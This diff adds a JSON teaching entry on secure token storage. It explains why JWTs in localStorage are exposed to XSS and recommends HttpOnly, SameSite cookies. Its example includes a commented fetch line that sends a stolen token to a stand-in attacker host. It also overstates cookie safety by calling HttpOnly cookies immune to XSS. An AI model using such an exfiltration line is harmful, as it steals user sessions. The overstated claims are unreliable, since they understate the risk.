@@ -1,0 +1,64 @@
+{
+  "version": "1.1",
+  "intent": "js.storage_security",
+  "topic": "Storage Security & JWTs",
+  "dimensions": {
+    "syntax": false,
+    "semantics": true,
+    "runtime": false
+  },
+  "relationships": {
+    "depends_on": [
+      "js.local_storage",
+      "js.cookies_intro"
+    ],
+    "related_to": [
+      "js.xss_intro",
+      "js.csrf_intro"
+    ],
+    "often_confused_with": []
+  },
+  "question_map": {
+    "what": [
+      "what data should never be stored locally"
+    ],
+    "why": [
+      "why is localstorage bad for jwt",
+      "why are cookies safer"
+    ],
+    "how": [
+      "how to store tokens securely"
+    ],
+    "compare": [
+      "localstorage vs httpOnly cookies for authentication"
+    ],
+    "output": [
+      "hacker steals jwt from localstorage via xss"
+    ]
+  },
+  "1_beginner_explanation": {
+    "summary": "When building login systems, the server gives you a 'Token' (like a JWT) to prove who you are. A massive mistake beginners make is storing this Token in `localStorage`. `localStorage` is completely vulnerable to XSS attacks (malicious JavaScript running on your page). If a hacker injects JS, they can read your `localStorage` and steal your users' accounts.",
+    "analogy": "Storing your house key (Token) in `localStorage` is like taping your house key to your front door. Anyone who walks by (any JavaScript on the page) can grab it. Storing it in an `HttpOnly` Cookie is like giving the key to a heavily guarded bank vault. You can still use it, but nobody can physically see or steal the key."
+  },
+  "2_internal_mechanism": {
+    "execution_flow": "Any JavaScript executing in the current Origin has synchronous read/write access to `window.localStorage`. This includes 3rd-party scripts (like an infected NPM package, an analytics tracker, or a malicious ad).",
+    "memory": "HttpOnly cookies reside in a protected memory space managed exclusively by the browser's networking layer. The JavaScript V8 engine is physically prevented from reading them."
+  },
+  "3_real_world_example": {
+    "use_case": "Understanding where to store sensitive authentication data.",
+    "code": "//  DANGEROUS: Never do this for Authentication Tokens!\nlocalStorage.setItem('jwt_token', 'eyJhbGciOiJIUzI1NiIsInR5c... ');\n\n// Any rogue script on the page can simply run:\n// fetch('https://hacker.com/steal?token=' + localStorage.getItem('jwt_token'));\n\n//  SECURE WAY:\n// The server should send the token in an HttpOnly, Secure, SameSite Cookie.\n// JavaScript does NOTHING. The browser automatically handles it safely."
+  },
+  "4_common_confusion": {
+    "trap": "Thinking cookies are immune to all attacks. While HttpOnly cookies are immune to XSS (Cross-Site Scripting, where hackers steal data), they are vulnerable to CSRF (Cross-Site Request Forgery, where hackers trick your browser into doing actions).",
+    "fix": "Use HttpOnly cookies to prevent XSS. Use SameSite cookie attributes (or CSRF tokens) to prevent CSRF."
+  },
+  "5_related_topics": [
+    "js.xss_intro",
+    "js.csrf_intro",
+    "js.authentication_vs_authorization"
+  ],
+  "6_edge_case": {
+    "quirk": "If you absolutely must store a token in JS (e.g., for a strictly decoupled SPA), the safest place is actually a closure variable inside memory, NOT in any storage API. However, this means the user logs out if they refresh the page.",
+    "code": ""
+  }
+}
